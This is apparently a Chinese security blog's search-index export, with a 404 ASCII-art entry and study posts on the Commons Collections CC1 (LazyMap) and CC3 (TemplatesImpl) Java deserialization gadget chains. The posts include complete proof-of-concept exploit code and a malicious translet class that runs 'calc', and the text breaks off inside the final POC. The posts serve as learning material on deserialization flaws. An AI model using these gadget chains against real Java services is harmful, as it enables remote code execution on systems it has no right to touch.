[{"title":"404图案","url":"/2022/11/04/404%E5%9B%BE%E6%A1%88/","content":"<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">         .----.</span><br><span class=\"line\">      _.&#x27;__    `.</span><br><span class=\"line\">  .--(4)(04)---/#\\</span><br><span class=\"line\">.&#x27; @          /###\\</span><br><span class=\"line\">:         ,   #####</span><br><span class=\"line\"> `-..__.-&#x27; _.-\\###/</span><br><span class=\"line\">       `;_:    `&quot;&#x27;</span><br><span class=\"line\">     .&#x27;&quot;&quot;&quot;&quot;&quot;`.</span><br><span class=\"line\">    /, Not ,\\\\</span><br><span class=\"line\">   // Found! \\\\</span><br><span class=\"line\">   `-._______.-&#x27;</span><br><span class=\"line\">   ___`. | .&#x27;___</span><br><span class=\"line\">  (______|______)</span><br></pre></td></tr></table></figure>\n\n","categories":["乱八七糟"],"tags":["颜文字"]},{"title":"CC1-LazyMap链","url":"/2023/03/06/CC1-LazyMap%E9%93%BE/","content":"<p><strong>先看TransformdMap链</strong></p>\n<p>实验环境： JDK-8u65、commons-collections 3.2.1</p>\n<p>在ysoserialize工具中的链子使用LazyMap来构造链子的，接下来分析一下LazyMap这条链子。后面调用InvokerTransformer类的利用点都是一样的。</p>\n<p><img src=\"/../images/image-20240423235729641.png\" alt=\"image-20240423235729641\"></p>\n<p>跟踪到LzyMap类中：进入到IF判断后，调用factory的transform方法；要想进入到IF判断，那么key不能在map集合中；</p>\n<p><img src=\"/../images/image-20240423235751132.png\" alt=\"image-20240423235751132\"></p>\n<p>factory参数是Transform类型的，可以控制，传参为chainedTransformer，就可以把后面的RCE链起来。</p>\n<p><img src=\"/../images/image-20240423235805150.png\" alt=\"image-20240423235805150\"></p>\n<p>接下来就是找哪里调用到了get方法（不同类中的同名方法），其实在AnnotationInvocationHandler类中就有get方法</p>\n<p>通过搜索，有5处调用了get方法。分别是inovke、equalsImpl、readObject方法中调用了get方法，分析发现readObject中的get方法无法利用，因为memberTypes参数无法控制，都是注解的成员方法，无法传入LazyMap对象。</p>\n<p><img src=\"/../images/image-20240423235828457.png\" alt=\"image-20240423235828457\"></p>\n<p>这条链子利用的是invoke方法，因为这条链子用到了动态代理（在反序列化利用链中的场景：不管调用目标类的什么方法，只要有方法调用 ，都会触发InvocationHandler接口实现类中的invoke方法）</p>\n<p>刚好的是AnnotationInvocationHandler类就是InvocationHandler接口的实现类，并且按照动态代理的概念，可以在实现类中重写invoke方法并增加目标类的功能点。</p>\n<p>分析invoke方法：里面的get方法是通过memberValues参数调用的，而该memberValues参数通过构造方法获得，我们可控，只需传入LazyMap对象即可链起来</p>\n<p><img src=\"/../images/image-20240423235844266.png\" alt=\"image-20240423235844266\"></p>\n<p>那么现在的问题就是：如何触发invoke方法，并且还需要在反序列化时必须调用目标类的某个方法，才能触发invoke方法，最后把链子连起来</p>\n<p>看一下AnnotationInvocationHandler类的readObject方法有没有能利用的点：可控参数memberValues调用了entrySet方法</p>\n<p><img src=\"/../images/image-20240423235904888.png\" alt=\"image-20240423235904888\"></p>\n<p>分析：该方法是Map接口中的一个方法，返回映射中包含的映射的 Set 视图。Set 视图意思是 Map 中所有的键值对都被看作是一个 set 集合。</p>\n<p><img src=\"/../images/image-20240423235918779.png\" alt=\"image-20240423235918779\"></p>\n<p>而利用类LazyMap刚好是有间接的继承关系的，相当于说LazyMap类继承了entrySet方法，那么此处就可以作为触发invoke方法的点</p>\n<p><img src=\"/../images/image-20240423235934358.png\" alt=\"image-20240423235934358\"></p>\n<p>思路大概就是：</p>\n<ol>\n<li>AnnotationInvocationHandler.readObject</li>\n<li>$Proxy1.entrySet（动态代理自动生成，目标类：LazyMap）</li>\n<li>AnnotationInvocationHandler.invoke</li>\n<li>LazyMap.get</li>\n</ol>\n<p>执行顺序：</p>\n<p>1.AnnotationInvocationHandler.readObject 执行到 for (Map.Entry memberValue : memberValues.entrySet()) 进入动态代理。</p>\n<p>2.动态代理调用AnnotationInvocationHandler.invoke ，然后执行到了memberValues.get(member); 就跳转到 LazyMap.get()</p>\n<p>3.LazyMap.get() 调用factory.transform()，连上链子，从而实现命令执行</p>\n<p>编写POC，还是利用LazyMap的静态方法decorate方法来创建对象，并控制该对象传入的参数</p>\n<p><img src=\"/../images/image-20240423235950723.png\" alt=\"image-20240423235950723\"></p>\n<p>POC分析:</p>\n<p>创建2个实现类AnnotationInvocationHandler的对象，第二个对象的第二个参数传入代理对象，调用目标类的entrySet方法，从而触发invoke方法调用</p>\n<p>35行的HashMap也不需要传入内容，定义即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import org.apache.commons.collections.Transformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\">import org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\">import java.lang.annotation.Target;</span><br><span class=\"line\">import java.lang.reflect.Constructor;</span><br><span class=\"line\">import java.lang.reflect.InvocationHandler;</span><br><span class=\"line\">import java.lang.reflect.Proxy;</span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * @author shiyingai</span><br><span class=\"line\"> * @create 2023-03-07 13:02</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class CC2 &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws Exception &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transforms = new Transformer[]&#123;</span><br><span class=\"line\">                new ConstantTransformer(Runtime.class), // 必须写在第一行，先获得Runtime类</span><br><span class=\"line\">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class=\"line\">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class=\"line\">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);</span><br><span class=\"line\">        // 以上代码是为了实现Runtime参与序列化，反射调用RCE</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(map,chainedTransformer);     // 返回一个LazyMap对象，返回类型是一个Map</span><br><span class=\"line\"></span><br><span class=\"line\">        Class annotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class=\"line\">        Constructor annotationInvocationHandlerConstructor =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class=\"line\">        annotationInvocationHandlerConstructor.setAccessible(true);</span><br><span class=\"line\">        InvocationHandler handler  = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class,decorateMap);  // 创捷实现类AnnotationInvocationHandler对象</span><br><span class=\"line\"></span><br><span class=\"line\">        Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),handler);  // 创建代理对象，因为实现类AnnotationInvocationHandler第二个参数是Map类型，所以强转成Map类型</span><br><span class=\"line\">        // 第二种写法：因为继承关系，所以直接就是写Map类即可</span><br><span class=\"line\">        // Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);</span><br><span class=\"line\"></span><br><span class=\"line\">        Object object = annotationInvocationHandlerConstructor.newInstance(Target.class,proxy);   // 传入代理对象，调用目标类的entrySet方法，从而触发invoke方法调用</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        // 对AnnotationInvocationHandler类进行序列化</span><br><span class=\"line\">        serialize(object);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 对AnnotationInvocationHandler类进行反序列化</span><br><span class=\"line\">        unserialize(&quot;ser.bin&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 序列化</span><br><span class=\"line\">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class=\"line\">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 反序列化</span><br><span class=\"line\">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class=\"line\">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        return obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注意：</p>\n<ul>\n<li><p>引入动态代理的条件</p>\n</li>\n<li><ul>\n<li>实现 InvocationHandler 接口</li>\n<li>重写invoke()方法</li>\n</ul>\n</li>\n<li><p>动态代理是可以被序列化的</p>\n</li>\n</ul>\n<p><img src=\"/../images/image-20240424000027262.png\" alt=\"image-20240424000027262\"></p>\n<p>执行POC</p>\n<p><img src=\"/../images/image-20240424000042036.png\" alt=\"image-20240424000042036\"></p>\n<p><strong>JDK8u71修复内容</strong></p>\n<p><img src=\"/../images/image-20240424000106052.png\" alt=\"image-20240424000106052\"></p>\n<p><img src=\"/../images/image-20240424000128322.png\" alt=\"image-20240424000128322\"></p>\n<p>分析：</p>\n<p>memberValues参数是通过过GetField获取，无法控制。针对TransformdMap链的setValue方法也直接没有了。</p>\n","categories":["Java反序列化漏洞专题"],"tags":["CC链","LazyMap","Commons Collections"]},{"title":"CC3-TemplatesImpl链","url":"/2023/03/08/CC3-TemplatesImpl%E9%93%BE/","content":"<p>实验环境： JDK-8u65、commons-collections 3.2.1</p>\n<p><strong>CC2、CC3、CC4不是命令执行的链子，而是代码执行（加载字节码文件，实现代码执行）</strong></p>\n<p>ClassLoader类的loadClass方法加载过程：findClass方法 –&gt; defineClass方法（从字节中加载类）</p>\n<h3 id=\"实战分析\"><a href=\"#实战分析\" class=\"headerlink\" title=\"实战分析\"></a>实战分析</h3><p>只进行类加载的话，是不会执行代码的；初始化后，就会执行代码</p>\n<p>利用点：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 类中定义了一个内部类 TransletClassLoader ，在此类中继承了ClassLoader类并重写了defineClass方法</p>\n<p>可以利用内部类TransletClassLoader这个重写的defineClass方法实现加载任意的恶意类文件</p>\n<p><img src=\"/../images/image-20240424000400039.png\" alt=\"image-20240424000400039\"></p>\n<p>defineClass这是个方法，返回类型是Class类型；可以看一下它继承的ClassLoader类中，说明它是个方法（m图标并且有返回值）</p>\n<p><img src=\"/../images/image-20240424000424534.png\" alt=\"image-20240424000424534\"></p>\n<p>那么就下来就是继续跟踪defineClass方法，看看哪里调用到；发现在当前类直接就有调用，通过defineTransletClasses方法调用，把结果保存在 _class 参数中</p>\n<p><img src=\"/../images/image-20240424000459158.png\" alt=\"image-20240424000459158\"></p>\n<p>继续跟踪defineTransletClasses方法，在getTransletInstance方法中有调用。</p>\n<p>分析：</p>\n<p>如果参数 _class 的值为null，就会调用defineTransletClasses方法；而在defineTransletClasses方法中会调用defineClass方法并把结果存放在 _class 中，获得 _class 参数后，继续往下执行就会调用到newInstance方法，该方法被调用后，就会进行初始化，从而指定通过defineClass方法加载的恶意代码（字节码文件）。</p>\n<p><img src=\"/../images/image-20240424000550505.png\" alt=\"image-20240424000550505\"></p>\n<p>继续跟踪getTransletInstance方法：最终在newTransformer方法中找到调用，并且newTransformer方法是public修饰的，可以直接调用而无需反射。那么链子基本上就构成了；只要调用newTransformer方法，就会一直调用到defineClass方法，来加载恶意字节码文件，构造任意代码执行。</p>\n<p>流程：【 newTransformer() –&gt; getTransletInstance() –&gt; defineTransletClasses() –&gt; defineClass() –&gt; newInstance() 】</p>\n<p><img src=\"/../images/image-20240424000614624.png\" alt=\"image-20240424000614624\"></p>\n<p>构造POC，前面已经把链子的大致流程梳理出来了。接下来就是构造满足参数条件的POC</p>\n<p><img src=\"/../images/image-20240424000629564.png\" alt=\"image-20240424000629564\"></p>\n<p>分析：</p>\n<p>newTransformer方法调用getTransletInstance方法，跟进getTransletInstance方法：参数_name必须不为null，否则就会直接return；参数_class就不用管，本身参数_class的值就是通过defineTransletClasses方法获得的。</p>\n<p><img src=\"/../images/image-20240424000644042.png\" alt=\"image-20240424000644042\"></p>\n<p>继续跟进defineTransletClasses方法：参数_bytecodes必须不为null，这样才不会抛出异常；参数_tfactary也不能为空，不然程序就无法继续执行下去</p>\n<p><img src=\"/../images/image-20240424000658943.png\" alt=\"image-20240424000658943\"></p>\n<p>参数_bytecodes的格式要求：先查看定义，是一个二维数据，在defineTransletClasses方法中传入的是一维数组，通过遍历把每个一维数组依次传入；这个参数是用来接收恶意字节码文件的二进制流的</p>\n<p><img src=\"/../images/image-20240424000713648.png\" alt=\"image-20240424000713648\"></p>\n<p><img src=\"/../images/image-20240424000722855.png\" alt=\"image-20240424000722855\"></p>\n<p>参数 _tfactory要求：</p>\n<p>这是一个transit修饰的参数，反序列化时获取不到值，所以就算通过反射修改了内容，反序列化也没有用，但是如果不加上内容肯定汇报空指针错误，导致代码无法执行。</p>\n<p>既然TemplatesIMpl类是继承Serializeable接口的，那说明该类可以进行序列化，既然能进行序列化，那么参数 _tfactory肯定是有值的，就只有可能在该类的readObject方法中就赋好初始值。这样子的话，在反序列化TemplatesImpl这个类的时候，就是触发readObject这个方法，然后自动给参数_tfactory赋初始值。</p>\n<p><img src=\"/../images/image-20240424000737922.png\" alt=\"image-20240424000737922\"></p>\n<p><img src=\"/../images/image-20240424000747034.png\" alt=\"image-20240424000747034\"></p>\n<p>编写恶意类并编译成字节码文件</p>\n<p><img src=\"/../images/image-20240424000758850.png\" alt=\"image-20240424000758850\"></p>\n<p>构造符合条件的参数</p>\n<p><img src=\"/../images/image-20240424000816157.png\" alt=\"image-20240424000816157\"></p>\n<p>运行POC，爆了空指针异常</p>\n<p><img src=\"/../images/image-20240424000835540.png\" alt=\"image-20240424000835540\"></p>\n<p>跟过去到defineTransletClasses方法看看，debug断点在defineTransletClasses方法分析看看：参数_bytecodes和参数_tfactory都是符合要求的，继续执行下去； </p>\n<p><img src=\"/../images/image-20240424000854795.png\" alt=\"image-20240424000854795\"></p>\n<p>defineClass方法的类加载也没有问题，可以执行下去，继续跟下去分析</p>\n<p><img src=\"/../images/image-20240424000909397.png\" alt=\"image-20240424000909397\"></p>\n<p>最终定位到参数_auxClasses是的null值，导致报错。defineTransletClasses方法要全部完全正确执行，才不会影响到链子，所以这里需要处理一下。</p>\n<p>分析代码：有个IF判断，现在就是两种解决思路：①满足IF判断的第一个条件，不执行到else，就不用给参数_auxClasses赋值了。②给参数_auxClasses赋值</p>\n<p>第一个IF判断条件：获取参数_class类的父类判断是否和常量ABSTRACT_TRANSLET相同，相同就进入IF判断。但是如果不进入第一个判断，而是进入else的话，那么参数_transletIndex的值默认就为 -1。就会进入第426行代码，抛出异常。所以这边不能让程序走到else语句中，那就要修改恶意类的代码，参数_class就是读取的恶意类。</p>\n<p><img src=\"/../images/image-20240424000928221.png\" alt=\"image-20240424000928221\"></p>\n<p>修改恶意类，直接让恶意类继承AbstractTranslet，这样子获得的父类就相同了。</p>\n<p>继承后，提示需要实现抽象方法（AbstractTranslet是一个抽象类）</p>\n<p><img src=\"/../images/image-20240424000953040.png\" alt=\"image-20240424000953040\"></p>\n<p>直接点击实现即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * @author shiyingai</span><br><span class=\"line\"> * @create 2023-03-09 20:22</span><br><span class=\"line\"> */</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">public class RCE extends AbstractTranslet&#123;</span><br><span class=\"line\">    static &#123;    // 静态代码块或者构造代码块都可以，因为会进行初始化，两种都会被调用</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class=\"line\">        &#125; catch (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20240424001021265.png\" alt=\"image-20240424001021265\"></p>\n<p>再次运行POC即可正常弹出计算器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.xml.transform.TransformerConfigurationException;</span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.nio.file.Files;</span><br><span class=\"line\">import java.nio.file.Paths;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * @author shiyingai</span><br><span class=\"line\"> * @create 2023-03-09 15:04</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class CC3 &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws Exception &#123;</span><br><span class=\"line\">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class=\"line\"></span><br><span class=\"line\">        /* 参数控制 */</span><br><span class=\"line\">        Class templatesClass = templates.getClass();</span><br><span class=\"line\">        // 修改 _name 参数</span><br><span class=\"line\">        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);</span><br><span class=\"line\">        nameField.setAccessible(true);</span><br><span class=\"line\">        nameField.set(templates,&quot;test&quot;);</span><br><span class=\"line\">        // 修改 _bytecodes 参数</span><br><span class=\"line\">        Field bytecodesFidld = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class=\"line\">        bytecodesFidld.setAccessible(true);</span><br><span class=\"line\">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\JavaSecurity\\\\CC\\\\target\\\\classes\\\\RCE.class&quot;));</span><br><span class=\"line\">        byte[][] codes = &#123;code&#125;;</span><br><span class=\"line\">        bytecodesFidld.set(templates,codes);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 修改 _tfactory 参数</span><br><span class=\"line\">        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class=\"line\">        tfactoryField.setAccessible(true);</span><br><span class=\"line\">        tfactoryField.set(templates,new TransformerFactoryImpl());</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        templates.newTransformer();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 序列化</span><br><span class=\"line\">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class=\"line\">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 反序列化</span><br><span class=\"line\">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class=\"line\">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        return obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20240424001046457.png\" alt=\"image-20240424001046457\"></p>\n<ul>\n<li>场景1</li>\n</ul>\n<p>这里利用链已经构造好了，可以直接使用之前CC1的入口即可；假设实际环境，ban了Runtime类的话，就可以使用这条链子，这条链子是代码执行。这里还是利用InvokerTransformer类的transform方法来替换调用这行代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">templates.newTransformer();</span><br></pre></td></tr></table></figure>\n\n<p>完整POC1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\">import org.apache.commons.collections.Transformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.xml.transform.TransformerConfigurationException;</span><br><span class=\"line\">import java.io.*;</span><br><span class=\"line\">import java.lang.annotation.Target;</span><br><span class=\"line\">import java.lang.reflect.Constructor;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.nio.file.Files;</span><br><span class=\"line\">import java.nio.file.Paths;</span><br><span class=\"line\">import java.util.HashMap;</span><br><span class=\"line\">import java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * @author shiyingai</span><br><span class=\"line\"> * @create 2023-03-09 15:04</span><br><span class=\"line\"> */</span><br><span class=\"line\">public class CC3 &#123;</span><br><span class=\"line\">    public static void main(String[] args) throws Exception &#123;</span><br><span class=\"line\">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class=\"line\"></span><br><span class=\"line\">        /* 参数控制 */</span><br><span class=\"line\">        Class templatesClass = templates.getClass();</span><br><span class=\"line\">        // 修改 _name 参数</span><br><span class=\"line\">        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);</span><br><span class=\"line\">        nameField.setAccessible(true);</span><br><span class=\"line\">        nameField.set(templates,&quot;test&quot;);</span><br><span class=\"line\">        // 修改 _bytecodes 参数</span><br><span class=\"line\">        Field bytecodesFidld = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class=\"line\">        bytecodesFidld.setAccessible(true);</span><br><span class=\"line\">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\\\JavaSecurity\\\\CC\\\\target\\\\classes\\\\RCE.class&quot;));</span><br><span class=\"line\">        byte[][] codes = &#123;code&#125;;</span><br><span class=\"line\">        bytecodesFidld.set(templates,codes);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 修改 _tfactory 参数</span><br><span class=\"line\">        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class=\"line\">        tfactoryField.setAccessible(true);</span><br><span class=\"line\">        tfactoryField.set(templates,new TransformerFactoryImpl());</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        // templates.newTransformer();</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transforms = new Transformer[]&#123;</span><br><span class=\"line\">                new ConstantTransformer(templates),</span><br><span class=\"line\">                new InvokerTransformer(&quot;newTransformer&quot;,null,null),</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);</span><br><span class=\"line\">        // 以上代码是为了实现Runtime参与序列化，反射调用RCE</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class=\"line\">        map.put(&quot;value&quot;,&quot;value_test&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(map,null,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class annotationInvocationHandlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class=\"line\">        Constructor annotationInvocationHandlerConstructor =  annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class=\"line\">        annotationInvocationHandlerConstructor.setAccessible(true);</span><br><span class=\"line\">        Object annotationInvocationHandlerObject =  annotationInvocationHandlerConstructor.newInstance(Target.class,decorateMap);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        // 对AnnotationInvocationHandler类进行序列化</span><br><span class=\"line\">        serialize(annotationInvocationHandlerObject);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 对AnnotationInvocationHandler类进行反序列化</span><br><span class=\"line\">        unserialize(&quot;ser.bin&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 序列化</span><br><span class=\"line\">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class=\"line\">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 反序列化</span><br><span class=\"line\">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class=\"line\">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        return obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/image-20240424001140954.png\" alt=\"image-20240424001140954\"></p>\n<ul>\n<li>场景2（ysoserialize中的写法）</li>\n</ul>\n<p>还存在另外的情况，如果实际环境把InvokerTransformer类也给ban了的话；那就得继续找哪里调用newTransformer方法的地方了（如果能直接找到某个类的readObject方法中直接调用newTransformer方法是最好的）。</p>\n<p>查找find usages，定位到TrAXFilter类中的构造方法：该构造方法直接传入一个Templates对象（TemplatesImpl类实现了Templates接口，所以可以直接传入TemplatesImpl对象），然后直接调用newTransformer方法</p>\n<p><img src=\"/../images/image-20240424001158524.png\" alt=\"image-20240424001158524\"></p>\n<p>但是TrAXFilter类没有实现Serializeable接口，所以无法进行序列化；如果想要序列化，只能通过反射的方式，Class类可以实现序列化；此处是通过TrAXFilter类的构造方法调用到TemplatesImpl对象的newTransformer方法的，仍然没有构成序列化的入口。</p>\n<p><img src=\"/../images/image-20240424001216832.png\" alt=\"image-20240424001216832\"></p>\n<p>CC3的作者找到一个可以反射初始化类的入口类（InstantiateTransformer，该类可以序列化），并且还是以transform方法调用的，可以直接和CC1之前的入口链连在一起</p>\n<p>transform方法分析：判断传入的input参数是不是Class类型的，如果是的话，就会去调用该参数的构造方法，并进行初始化创建对象。</p>\n<p><img src=\"/../images/image-20240424001230902.png\" alt=\"image-20240424001230902\"></p>\n<p>参数iParamTypes和参数iArgs通过该类的构造方法传入，分别是TrAXFilter类中构造方法的参数类型和参数值。</p>\n<p><img src=\"/../images/image-20240424001245495.png\" alt=\"image-20240424001245495\"></p>\n<p>最终POC</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\">import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class=\"line\">import org.apache.commons.collections.Transformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\">import org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.xml.crypto.dsig.Transform;</span><br><span class=\"line\">import javax.xml.transform.Templates;</span><br><span class=\"line\">import javax.xml.transform.TransformerConfigurationException;</span><br><span class=\"line\">import java.io.*;</span><br><span 